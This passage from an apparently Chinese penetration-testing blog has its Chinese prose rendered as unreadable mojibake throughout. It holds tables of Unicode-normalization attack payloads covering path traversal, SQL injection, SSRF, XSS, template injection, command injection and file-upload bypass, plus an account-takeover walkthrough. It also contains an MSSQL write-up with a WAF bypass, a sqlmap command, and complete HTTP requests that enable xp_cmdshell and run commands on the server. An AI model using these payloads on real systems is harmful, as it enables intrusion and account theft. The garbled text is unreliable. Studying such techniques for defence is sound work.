<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ å­—ç¬¦ <code>â‰® </code> å°†æ— æ³•å®ç°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ï¼Œå› ä¸ºå®ƒä¼šæ³¨å…¥å­—ç¬¦ <code>â—ŒÌ¸ </code> (U+0338)ï¼Œ å¹¶å°†ç ´åæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚</p>
<h3 id="åˆ©ç”¨å…¶ä»–æ¼æ´"><a href="#åˆ©ç”¨å…¶ä»–æ¼æ´" class="headerlink" title="åˆ©ç”¨å…¶ä»–æ¼æ´"></a>åˆ©ç”¨å…¶ä»–æ¼æ´</h3><p>å¦‚æœåº”ç”¨ç¨‹åºæ‰§è¡Œäº†Unicodeè§„èŒƒåŒ–ï¼Œå¯ä»¥å°è¯•åˆ¶ä½œå¤§é‡è‡ªå®šä¹‰ payloadï¼Œå¹¶åœ¨ä»¥ä¸‹æ¼æ´ä¸­åº”ç”¨ï¼š</p>
<ul>
<li><strong>Path Traversal</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>â€¥ (U+2025)</td>
<td>â€¥&#x2F;â€¥&#x2F;â€¥&#x2F;etc&#x2F;passwd</td>
<td>..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</td>
</tr>
<tr>
<td>ï¸°(U+FE30)</td>
<td>ï¸°&#x2F;ï¸°&#x2F;ï¸°&#x2F;etc&#x2F;passwd</td>
<td>..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</td>
</tr>
</tbody></table>
<ul>
<li><strong>SQL Injection</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ï¼‡(U+FF07)</td>
<td>ï¼‡ or ï¼‡1ï¼‡&#x3D;ï¼‡1</td>
<td>â€™ or â€˜1â€™&#x3D;â€™1</td>
</tr>
<tr>
<td>ï¼‚(U+FF02)</td>
<td>ï¼‚ or ï¼‚1ï¼‚&#x3D;ï¼‚1</td>
<td>â€ or â€œ1â€&#x3D;â€1</td>
</tr>
<tr>
<td>ï¹£ (U+FE63)</td>
<td>adminï¼‡ï¹£ï¹£</td>
<td>adminâ€™â€“</td>
</tr>
</tbody></table>
<ul>
<li><strong>Server Side Request Forgery (SSRF)</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>â“ª (U+24EA)</td>
<td>â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </td>
<td>127.0.0.1</td>
</tr>
</tbody></table>
<ul>
<li><strong>Open Redirect</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ã€‚(U+3002)</td>
<td>jlajaraã€‚gitlabã€‚io</td>
<td>jlajara.gitlab.io</td>
</tr>
<tr>
<td>ï¼(U+FF0F)</td>
<td>ï¼ï¼jlajara.gitlab.io</td>
<td>&#x2F;&#x2F;jlajara.gitlab.io</td>
</tr>
</tbody></table>
<ul>
<li><strong>XSS</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ï¼œ(U+FF1C)</td>
<td>ï¼œscript src&#x3D;aï¼ï¼</td>
<td>ï¼œscript src&#x3D;a&#x2F;&gt;</td>
</tr>
<tr>
<td>ï¼‚(U+FF02)</td>
<td>ï¼‚onclick&#x3D;ï¼‡prompt(1)ï¼‡</td>
<td>â€œonclick&#x3D;â€™prompt(1)â€™</td>
</tr>
</tbody></table>
<ul>
<li><strong>Template Injection</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ï¹›(U+FE5B)</td>
<td>ï¹›ï¹›3+3ï¹œï¹œ</td>
<td>6</td>
</tr>
<tr>
<td>ï¼» (U+FF3B)</td>
<td>ï¼»ï¼»5+5ï¼½ï¼½</td>
<td>[[5+5]]</td>
</tr>
</tbody></table>
<ul>
<li><strong>OS Command Injection</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ï¼† (U+FF06)</td>
<td>ï¼†ï¼†whoami</td>
<td>&amp;&amp;whoami</td>
</tr>
<tr>
<td>ï½œ (U+FF5C)</td>
<td>ï½œï½œ whoami</td>
<td>||whoami</td>
</tr>
</tbody></table>
<ul>
<li><strong>Arbitrary file upload</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ï½ (U+FF50) Ê° (U+02B0)</td>
<td>test.ï½Ê°ï½</td>
<td>test.php</td>
</tr>
</tbody></table>
<ul>
<li><strong>Business logic</strong></li>
</ul>
<p>æ³¨å†Œå…·æœ‰ä¸å…¶ä»–ç”¨æˆ·ç›¸ä¼¼çš„æŸäº›å­—ç¬¦çš„ç”¨æˆ·ã€‚ä¹Ÿè®¸æ³¨å†Œè¿‡ç¨‹ä¼šå…è®¸æ³¨å†Œï¼Œå› ä¸ºè¿™ä¸€æ­¥çš„ç”¨æˆ·æ²¡æœ‰è¢«è§„èŒƒåŒ–å¹¶ä¸”å…è®¸è¿™ä¸ªå­—ç¬¦ã€‚ä¹‹åï¼Œå‡è®¾åº”ç”¨ç¨‹åºåœ¨æ£€ç´¢åˆ°ç”¨æˆ·æ•°æ®åæ‰§è¡Œäº†ä¸€äº›è§„èŒƒåŒ–ã€‚</p>
<ol>
<li>æ³¨å†ŒÂªdminã€‚æ•°æ®åº“ä¸­æ²¡æœ‰æ¡ç›®ï¼Œæ³¨å†ŒæˆåŠŸã€‚</li>
<li>ç™»å½•ä¸ºÂªdminã€‚åç«¯æ‰§è¡Œè§„èŒƒåŒ–å¹¶ç»™å‡ºadmin.</li>
<li>è´¦æˆ·æ¥ç®¡ã€‚</li>
</ol>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>Âª (U+00AA)</td>
<td>Âªdmin</td>
<td>admin</td>
</tr>
</tbody></table>
<h3 id="è¯†åˆ«-Unicode-è§„èŒƒåŒ–æ¼æ´"><a href="#è¯†åˆ«-Unicode-è§„èŒƒåŒ–æ¼æ´" class="headerlink" title="è¯†åˆ« Unicode è§„èŒƒåŒ–æ¼æ´"></a>è¯†åˆ« Unicode è§„èŒƒåŒ–æ¼æ´</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æäº¤ä¸€äº›ç‰¹å®šçš„å¼‚å‹å­—ç¬¦ï¼Œå¦‚ï¼šğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒï¼Œå¹¶æŸ¥çœ‹è¿”å›å†…å®¹æ˜¯å¦åŒ…å«Leonishanï¼Œä»¥ç¡®å®šæ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ã€‚</p>
<p>æäº¤æœ‰æ•ˆè½½è·çš„ URL ç¼–ç ç‰ˆæœ¬ ğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒ ( %F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83) ä¼šç»™å‡ºä»¥ä¸‹å“åº”ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: Leonishan</span></span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œè¿›è¡Œäº† unicode å…¼å®¹æ€§ âœ…</p>
<p>å¦‚æœæˆ‘ä»¬æäº¤æœ‰æ•ˆè½½è·å¹¶ä¸”å“åº”å¦‚ä¸‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: Ã°ÂÂ•ÂƒÃ¢Â…Â‡Ã°ÂÂ™Â¤Ã°ÂÂ“ÂƒÃ¢Â…ÂˆÃ°ÂÂ”Â°Ã°ÂÂ”Â¥Ã°ÂÂ™Â–Ã°ÂÂ“Âƒ</span></span><br></pre></td></tr></table></figure>

<p>ä¸æ‰§è¡Œ Unicode å…¼å®¹æ€§ âŒ</p>
<p>æ³¨æ„ï¼šå¦‚æœè¦ä½¿ç”¨ BurpSuite æ‰§è¡Œæ­¤æµ‹è¯•ï¼Œåˆ™å¿…é¡»é¦–å…ˆå¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œ URL ç¼–ç ã€‚Burp çš„ç¼–è¾‘å™¨ä¸èƒ½æ­£ç¡®å¤„ç†å¤šå­—èŠ‚å­—ç¬¦ã€‚</p>
<h3 id="ä¸€æ¬¡çœŸå®çš„ç®€å•æµ‹è¯•"><a href="#ä¸€æ¬¡çœŸå®çš„ç®€å•æµ‹è¯•" class="headerlink" title="ä¸€æ¬¡çœŸå®çš„ç®€å•æµ‹è¯•"></a>ä¸€æ¬¡çœŸå®çš„ç®€å•æµ‹è¯•</h3><p>å¯¹æŸç³»ç»Ÿçš„å¿˜è®°å¯†ç åŠŸèƒ½è¿›è¡Œæµ‹è¯•ï¼Œå‘ç° account å‚æ•°å­˜åœ¨ Unicode å…¼å®¹è§£æã€‚æ³¨å†Œä¸€ä¸ªä¸çœŸå®è´¦å·ï¼ˆ<code>44***31992************</code>ï¼‰ ç±»ä¼¼çš„è´¦å·<code>44***Â³1992************</code> ï¼Œè´¦æˆ·ä¿¡æ¯æ‰‹æœºå·ç å¤„å¡«å†™æ”»å‡»è€…çš„æ‰‹æœºå·ç ã€‚æ‰§è¡Œå¿˜è®°å¯†ç æµç¨‹ï¼Œè´¦æˆ·å¡«å†™ <code>44***Â³1992************</code>ï¼Œæ”»å‡»è€…æ‰‹æœºèƒ½æˆåŠŸæ¥æ”¶é‡ç½®åçš„å¯†ç ã€‚ä½¿ç”¨é‡ç½®åçš„å¯†ç ç™»é™†çœŸå®è´¦å·<code>44***31992************</code>ï¼ŒæˆåŠŸç™»é™†ã€‚</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220413200326.png"></p>
<h2 id="0x03-å‚è€ƒ"><a href="#0x03-å‚è€ƒ" class="headerlink" title="0x03 å‚è€ƒ"></a>0x03 å‚è€ƒ</h2><p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/charset-encoding.html/">https://www.runoob.com/w3cnote/charset-encoding.html\</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/hyongilfmmm/article/details/112045049/">https://blog.csdn.net/hyongilfmmm/article/details/112045049\</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1470820/">https://cloud.tencent.com/developer/article/1470820\</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4b6861e22df7/">https://www.jianshu.com/p/4b6861e22df7\</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/benbenalin/p/6921553.html/">https://www.cnblogs.com/benbenalin/p/6921553.html\</a><br><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work/">https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work\</a><br><a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/07/%E4%BB%8EMSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/07/%E4%BB%8EMSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">ä»MSSQLæŠ¥é”™æ³¨å…¥åˆ°å †å æ³¨å…¥ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-07 20:44:36 / Modified: 22:25:26" itemprop="dateCreated datePublished" datetime="2022-04-07T20:44:36+08:00">2022-04-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQLi/" itemprop="url" rel="index"><span itemprop="name">SQLi</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ä»MSSQLæŠ¥é”™æ³¨å…¥åˆ°å †å æ³¨å…¥ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ"><a href="#ä»MSSQLæŠ¥é”™æ³¨å…¥åˆ°å †å æ³¨å…¥ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä»MSSQLæŠ¥é”™æ³¨å…¥åˆ°å †å æ³¨å…¥ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ"></a>ä»MSSQLæŠ¥é”™æ³¨å…¥åˆ°å †å æ³¨å…¥ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ</h1><h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01-å‰è¨€"></a>0x01-å‰è¨€</h2><p>è¿‘æ—¥å¯¹ä¸€å·²æˆæƒçš„ç«™ç‚¹è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œéšæ‰‹ä¸€ä¸ªå•å¼•å·ï¼Œå‘ç°å­˜åœ¨SQLæŠ¥é”™ä¿¡æ¯ã€‚</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage1.png" alt="å›¾ä¸€"></p>
<h2 id="0x02-æŠ¥é”™æ³¨å…¥"><a href="#0x02-æŠ¥é”™æ³¨å…¥" class="headerlink" title="0x02-æŠ¥é”™æ³¨å…¥"></a>0x02-æŠ¥é”™æ³¨å…¥</h2><p>å°è¯•æŠ¥é”™æ³¨å…¥ï¼Œå‘ç°ç³»ç»Ÿå­˜åœ¨ä¸¤å±‚é˜²å¾¡ï¼Œä¸€ä¸ªæ˜¯äº‘WAFï¼Œä¸€ä¸ªä»£ç é˜²å¾¡ã€‚å¼€å§‹ä½¿ç”¨åˆ†å—ä¼ è¾“ç»•è¿‡äº‘WAFï¼ˆä½¿ç”¨çš„æ˜¯Burpsuiteæ’ä»¶ï¼š<code>chunked-coding-converter-0.4.0</code>ï¼‰ï¼Œç¡®å®å¯ä»¥ç»•è¿‡ã€‚ä½†åé¢ä½¿ç”¨ <code>select</code> è¯­å¥çš„æ—¶å€™ï¼Œè¢«åç«¯ä»£ç æ‹¦æˆªäº†ï¼Œæç¤ºéæ³•è®¿é—®ã€‚åç»­ä¿®æ”¹ POST æ•°æ® <code>Content-Type</code> ä¸º JSON æ ¼å¼åï¼Œç›´æ¥ç»•è¿‡äº‘ WAF ä»¥åŠåç«¯ä»£ç ä¸¤å±‚é˜²å¾¡ã€‚å…·ä½“ç»•è¿‡æµ‹è¯•ç»“æœå¦‚ä¸‹å›¾ã€‚</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage2.png" alt="å›¾äºŒ"></p>
<p>æ ¹æ®å·²çŸ¥ä¿¡æ¯ï¼Œä½¿ç”¨ SQLMAP æ ¹æ®è¿›è¡Œæ•°æ®æå–ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r sql.txt <span class="comment">--level 5 --risk 2 --batch --dbms=&quot;Microsoft SQL Server&quot; --technique=E --prefix=&quot;)&quot; --dbs</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage3.png" alt="å›¾ä¸‰"></p>
<h2 id="0x03-å‡çº§ä¸ºå †å æ³¨å…¥"><a href="#0x03-å‡çº§ä¸ºå †å æ³¨å…¥" class="headerlink" title="0x03-å‡çº§ä¸ºå †å æ³¨å…¥"></a>0x03-å‡çº§ä¸ºå †å æ³¨å…¥</h2><p>çŒœæƒ³è¯¥æ³¨å…¥ç‚¹æ”¯æŒå †å æ³¨å…¥ã€‚ä½†ç›´æ¥ä½¿ç”¨ <code>1);select 1</code> ï¼ŒæœåŠ¡å™¨æ˜¯æŠ¥é”™çš„ã€‚æ‰€ä»¥å¿…é¡»çŸ¥é“åŸå§‹çš„æŸ¥è¯¢è¯­å¥æ‰å¯ä»¥æ­£ç¡®é—­åˆã€‚</p>
<h3 id="æŸ¥è¯¢æ­£åœ¨æ‰§è¡Œçš„è¯­å¥"><a href="#æŸ¥è¯¢æ­£åœ¨æ‰§è¡Œçš„è¯­å¥" class="headerlink" title="æŸ¥è¯¢æ­£åœ¨æ‰§è¡Œçš„è¯­å¥"></a>æŸ¥è¯¢æ­£åœ¨æ‰§è¡Œçš„è¯­å¥</h3><p>æ¯ä¸ªæ•°æ®åº“å°±æœ‰ä¸€ä¸ªé»˜è®¤è¡¨å­˜å‚¨ç€æ­£åœ¨æ‰§è¡Œçš„SQLè¯­å¥ï¼ŒMYSQL æ­£åœ¨æ‰§è¡ŒæŸ¥è¯¢çš„SQLè¯­å¥ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<p>MSSQL ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">der.[session_id],der.[blocking_session_id],</span><br><span class="line">sp.lastwaittype,sp.hostname,sp.program_name,sp.loginame,</span><br><span class="line">der.[start_time] <span class="keyword">AS</span> <span class="string">&#x27;å¼€å§‹æ—¶é—´&#x27;</span>,</span><br><span class="line">der.[status] <span class="keyword">AS</span> <span class="string">&#x27;çŠ¶æ€&#x27;</span>,</span><br><span class="line">dest.[text] <span class="keyword">AS</span> <span class="string">&#x27;sqlè¯­å¥&#x27;</span>,</span><br><span class="line">DB_NAME(der.[database_id]) <span class="keyword">AS</span> <span class="string">&#x27;æ•°æ®åº“å&#x27;</span>,</span><br><span class="line">der.[wait_type] <span class="keyword">AS</span> <span class="string">&#x27;ç­‰å¾…èµ„æºç±»å‹&#x27;</span>,</span><br><span class="line">der.[wait_time] <span class="keyword">AS</span> <span class="string">&#x27;ç­‰å¾…æ—¶é—´&#x27;</span>,</span><br><span class="line">der.[wait_resource] <span class="keyword">AS</span> <span class="string">&#x27;ç­‰å¾…çš„èµ„æº&#x27;</span>,</span><br><span class="line">der.[logical_reads] <span class="keyword">AS</span> <span class="string">&#x27;é€»è¾‘è¯»æ¬¡æ•°&#x27;</span></span><br><span class="line"><span class="keyword">FROM</span> sys.[dm_exec_requests] <span class="keyword">AS</span> der</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> master.dbo.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">ON</span> der.session_id<span class="operator">=</span>sp.spid</span><br><span class="line"><span class="keyword">CROSS</span> APPLY  sys.[dm_exec_sql_text](der.[sql_handle]) <span class="keyword">AS</span> dest</span><br><span class="line"><span class="comment">--WHERE [session_id]&gt;50 AND session_id&lt;&gt;@@SPID</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> der.[session_id]</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>ç®€åŒ–åä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> dest.[text] <span class="keyword">AS</span> <span class="string">&#x27;sql&#x27;</span> <span class="keyword">FROM</span> sys.[dm_exec_requests] <span class="keyword">AS</span> der <span class="keyword">INNER</span> <span class="keyword">JOIN</span> master.dbo.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">ON</span> der.session_id<span class="operator">=</span>sp.spid <span class="keyword">CROSS</span> APPLY  sys.[dm_exec_sql_text](der.[sql_handle]) <span class="keyword">AS</span> dest <span class="keyword">ORDER</span> <span class="keyword">BY</span> der.[session_id])</span><br></pre></td></tr></table></figure>

<p>æ­£åœ¨æ‰§è¡Œçš„SQLè¯­å¥åŸå‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage4.png" alt="å›¾å››"></p>
<blockquote>
<p>By the wayï¼šå…³äºè·å– SQL åŸå§‹è¯­å¥å°† <strong>â€œå¸ƒå°”ç›²æ³¨â€</strong> å‡çº§ä¸º <strong>â€œUNION æ³¨å…¥â€</strong> çš„æ›´å¤šå†…å®¹è¯¦è§ä¸‹æ–‡ï¼š<a target="_blank" rel="noopener" href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f">https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f</a></p>
</blockquote>
<p>é—­åˆåŸå§‹sqlè¯­å¥ï¼Œè¿›è¡Œå †å æ³¨å…¥ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># å¼€å¯ xp_cmdshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/é©¬èµ›å…‹</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>é©¬èµ›å…‹:8082</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>128</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://é©¬èµ›å…‹:8082</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://é©¬èµ›å…‹:8082/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>é©¬èµ›å…‹</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-haxe">&#123;<span class="string">&quot;ids&quot;</span>:<span class="type"></span>&quot;<span class="number">111</span>);EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;SELECT é©¬èµ›å…‹ FROM dbo.é©¬èµ›å…‹ WHERE x IN (<span class="number">111</span><span class="string">&quot;&#125;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># æ‰§è¡Œ ping å‘½ä»¤</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/é©¬èµ›å…‹</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>é©¬èµ›å…‹:8082</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>128</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://é©¬èµ›å…‹:8082</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://é©¬èµ›å…‹:8082/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>é©¬èµ›å…‹</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">&#123;&quot;ids&quot;:&quot;111);exec master..xp_cmdshell &#x27;ping bf5af7e2005beb3706534f7b0ab4.ns.pingb.in&#x27;;<span class="keyword">SELECT</span> é©¬èµ›å…‹ <span class="keyword">FROM</span> dbo.é©¬èµ›å…‹ <span class="keyword">WHERE</span> x <span class="keyword">IN</span> (<span class="number">111</span><span class="string">&quot;&#125;</span></span></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœï¼š</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220407203229.png" alt="å›¾äº”"></p>
<h1 id="0x04-å…¶ä»–"><a href="#0x04-å…¶ä»–" class="headerlink" title="0x04-å…¶ä»–"></a>0x04-å…¶ä»–</h1><p><strong>æŸ¥è¯¢æ‰§è¡Œè¿‡çš„ sql è¯­å¥</strong></p>
